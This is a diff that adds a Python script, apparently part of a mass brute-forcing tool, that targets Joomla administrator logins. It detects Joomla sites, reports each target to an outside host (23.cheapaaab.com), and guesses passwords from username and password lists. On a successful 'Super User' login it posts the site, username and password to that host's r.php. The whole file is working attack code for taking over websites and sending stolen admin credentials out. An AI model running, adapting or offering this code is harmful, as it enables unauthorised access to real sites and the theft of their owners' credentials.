@@ -1,0 +1,244 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time    : 2017/9/5 15:13
+# @Author  : Jackie
+# @File    : bruteWorker.py
+
+from BeautifulSoup import BeautifulSoup
+import requests
+import gevent
+import urllib
+import urllib2
+import threading
+import time
+
+
+class BruteWorker(object):
+    def __init__(self, url, usernameList, passwdList, lines, logger):
+        self.url = url
+        self.usernameList = usernameList
+        self.passwdList = passwdList
+        self.username = ''
+        self.passwd = ''
+        self.ret = ""
+        self.md5 = ""
+        self.web = ""
+        self.submit = ""
+        self.Submit = ""
+        self.times = 0
+        self.lines = lines
+        self.logger = logger
+
+    def gettime(self):
+        return time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
+
+    def run(self):
+#        url = self.url
+#        while url.rfind('/') != url.find('//') + 1:
+#            url = url[0:url.rfind('/')]
+#            self.judge(url)
+        self.logger.info(str(self.lines) + '  ' + self.url + '  begin')
+        self.judge(self.url)
+        return
+
+    def judge(self, url):
+        ret = 0
+        target = url + 'administrator/index.php'
+        try:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+                'Content-Type': 'application/x-www-form-urlencoded'}
+            r = requests.get(target, headers=headers, allow_redirects=False)
+            if r.status_code == requests.codes.ok:
+                if r.text.find('joomla') == -1 and r.text.find('Joomla') == -1:
+                    date_time = str(self.gettime())
+                    ret = -1
+            else:
+                date_time = str(self.gettime())
+                ret = -1
+
+        except requests.exceptions.ConnectTimeout:
+            NETWORK_STATUS = False
+            date_time = str(self.gettime())
+#            print date_time + ':' + target + '  ConnectTimeout get html'
+            ret = -1
+        except requests.exceptions.Timeout:
+            REQUEST_TIMEOUT = True
+            date_time = str(self.gettime())
+#            print date_time + ':' + target + '  Timeout get html'
+            ret = -1
+        except requests.exceptions.ConnectionError:
+            REQUEST_EXEC = True
+            date_time = str(self.gettime())
+#            print date_time + ':' + target + '  ConnectionError get html'
+            ret = -1
+        except:
+            date_time = str(self.gettime())
+#            print date_time + ':' + target + '  Error get html'
+            ret = -1
+
+        if ret == -1:
+            date_time = str(self.gettime())
+#            print date_time + ':' + target + '  bruteForce falied'
+            return -1
+
+        result = target
+        resultData = {'l': result}
+        r = requests.post('http://23.cheapaaab.com/j.php', data = resultData)
+
+        session = self.getinfo(target)
+        if session == -1:
+            date_time = str(self.gettime())
+#            print date_time + ':' + target + '  bruteForce falied'
+            return -1
+
+        self.brute(target, session)
+        return ret
+
+    def brute(self, target, session):
+        flag = False
+        for m in self.usernameList:
+            if flag == True:
+                break
+            self.username = m.strip()
+            webinfo = self.url[target.find('/') + 2:]
+            webinfo_split = webinfo.split('.')
+            index = -2
+            while True:
+                try:
+                    if len(webinfo_split[index]) > 3:
+                        self.web = webinfo_split[index]
+                        break
+                    index = index - 1
+                except:
+                    self.web = webinfo_split[0]
+                    break
+            self.username = self.username.replace('%web%', self.web)
+            for n in self.passwdList:
+                if flag == True:
+                   break
+                self.passwd = n.strip()
+                self.passwd = self.passwd.replace('%user%', self.username)
+                self.passwd = self.passwd.replace('%web%', self.web)
+                r = self.login(target, session)
+                if r == 1:
+                    return
+                elif r == -1:
+                    flag = True
+                    break
+
+    def getinfo(self, target):
+        data = {}
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': target}
+        try:
+            session = requests.Session()
+            html = session.get(target, headers = headers, allow_redirects=False)
+            soup = BeautifulSoup(html.text)
+            for line in soup.findAll('input'):
+                 line_dict = dict(line.attrs)
+                 if(line_dict.has_key('name') and line_dict.has_key('value')):
+                     if(line_dict['name'] == 'return'):
+                         self.ret = line_dict['value']
+                     if(line_dict['value'] == '1'):
+                         self.md5 = line_dict['name']
+                     if(line_dict['name'] == 'Submit'):
+                         self.submit = line_dict['value']
+                     if(line_dict['name'] == 'submit'):
+                         self.submit = line_dict['value']
+        except requests.exceptions.ConnectTimeout:
+            NETWORK_STATUS = False
+#            print date_time + ':' + target + '  ConnectTimeout get html'
+            return -1
+#           time.sleep(60)
+        except requests.exceptions.Timeout:
+            REQUEST_TIMEOUT = True
+#            print date_time + ':' + target + '  Timeout get html'
+            return -1
+#           time.sleep(60)
+        except requests.exceptions.ConnectionError:
+            REQUEST_EXEC = True
+#            print date_time + ':' + target + '  ConnectionError get html'
+            return -1
+#            time.sleep(60)
+        except:
+#            print date_time + ':' + target + '  Error get html'
+            return -1
+#            time.sleep(60)
+        return session
+
+    def login(self, target, session):
+        data = {}
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': target}
+        date_time = str(self.gettime())
+        self.logger.info(target + '  ' + self.username + '  ' + self.passwd)
+        self.times = 0
+        while True:
+            submit = ''
+            if self.submit != '':
+                submit = self.submit.encode('raw_unicode_escape')
+            else:
+                submit = self.Submit.encode('raw_unicode_escape')
+
+            data = {'username': self.username,
+                    'passwd': self.passwd,
+                    'option': 'com_login',
+                    'task': 'login',
+                    'lang': '',
+                    'submit': submit,
+                    'return': self.ret.encode('raw_unicode_escape'),
+                    self.md5.encode('raw_unicode_escape'): '1'}
+
+            try:
+                ret = session.post(target, cookies = session.cookies, data = data, headers = headers)
+                if ret.text.find('Super User') != -1:
+                    self.logger.info('success  ' + target+'  '+self.username+'  '+self.passwd)
+                    result = target + '|' + self.username + '|' + self.passwd
+                    resultData = {'l': result}
+                    r = requests.post('http://23.cheapaaab.com/r.php', data = resultData)
+                    return 1
+                else:
+                    soup = BeautifulSoup(ret.text)
+                    for line in soup.findAll('input'):
+                        line_dict = dict(line.attrs)
+                        if(line_dict.has_key('name') and line_dict.has_key('value')):
+                            if(line_dict['value'] == '1'):
+                                self.md5 = line_dict['name']
+                    
+            except requests.exceptions.ConnectTimeout:
+                NETWORK_STATUS = False
+#                print date_time + ':' + target + '  ConnectTimeout post'
+                self.times = self.times + 1
+                if self.times == 4:
+                    return -1
+#                time.sleep(60)
+                continue
+            except requests.exceptions.Timeout:
+                REQUEST_TIMEOUT = True
+#                print date_time + ':' + target + '  Timeout post'
+                self.times = self.times + 1
+                if self.times == 4:
+                    return -1
+#                time.sleep(60)
+                continue
+            except requests.exceptions.ConnectionError:
+                REQUEST_EXEC = True
+#                print date_time + ':' + target + '  ConnectionError post'
+                self.times = self.times + 1
+                if self.times == 4:
+                    return -1
+#                time.sleep(60)
+                continue
+            except:
+#                print date_time + ':' + target + '  Error post'
+                self.times = self.times + 1
+                if self.times == 4:
+                    return -1
+#                time.sleep(60)
+                continue
+            return 
